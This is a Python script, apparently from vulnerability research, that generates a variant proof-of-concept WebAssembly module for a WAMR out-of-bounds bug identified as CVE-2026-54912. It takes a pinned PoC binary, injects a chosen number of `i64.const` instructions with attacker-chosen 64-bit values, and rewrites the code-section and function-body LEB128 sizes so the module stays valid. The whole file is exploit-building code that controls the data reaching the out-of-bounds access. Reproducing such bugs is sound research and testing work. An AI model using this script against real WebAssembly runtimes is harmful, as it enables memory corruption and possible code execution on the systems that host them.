#!/usr/bin/env python3
"""Reproduce the WAMR CVE-2026-54912 chosen-immediate OOB variant.

Reads the pinned const_table_overflow.wasm, inserts N pairs of
`i64.const <chosen>; drop` after the 21-result block's `end` and before
the 20 trailing `drop`s, and fixes the code-section and body LEB sizes.

Usage: python3 make_chosen_variant.py <out.wasm> [base_hex] [count]
Default base is 0x4142434445464700; successive constants add 1 to it.
The upstream PoC itself is unchanged; this is a different module shape.
"""

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE / "src" / "const_table_overflow.wasm"


def enc_sleb(v):
    out = bytearray()
    while True:
        byte = v & 0x7F
        v >>= 7
        done = (v == 0 and not (byte & 0x40)) or (v == -1 and (byte & 0x40))
        if not done:
            byte |= 0x80
        out.append(byte)
        if done:
            return out


def enc_uleb(v):
    out = bytearray()
    while True:
        x = v & 0x7F
        v >>= 7
        if v:
            out.append(x | 0x80)
        else:
            out.append(x)
            return out


def main():
    out_path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("chosen.wasm")
    base = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x4142434445464700
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 8
    b = bytearray(SRC.read_bytes())

    # Pinned PoC layout: code section id at 53, 3-byte section size,
    # 1 function, 3-byte body size, body payload at 61.
    assert b[53] == 10
    assert b[54] == 0xDD and b[55] == 0x81 and b[56] == 0x03
    assert b[57] == 1
    assert b[58] == 0xD9 and b[59] == 0x81 and b[60] == 0x03
    body_off = 61

    # Block `end`, 20 `drop`s, function `end` at the very end of the body.
    ins = len(b) - 1 - 20 - 1
    assert b[ins] == 0x0B
    assert all(x == 0x1A for x in b[ins + 1 : ins + 21])
    assert b[ins + 21] == 0x0B

    payload = bytearray()
    for k in range(count):
        payload += b"\x42" + enc_sleb(base + k) + b"\x1A"
    b[ins + 1 : ins + 1] = payload
    b[58:61] = enc_uleb(49369 + len(payload))
    b[54:57] = enc_uleb(49373 + len(payload))
    assert len(b) == 49430 + len(payload)
    out_path.write_bytes(b)
    print(f"wrote {out_path}: {len(b)} bytes, inserted {len(payload)}")


if __name__ == "__main__":
    main()
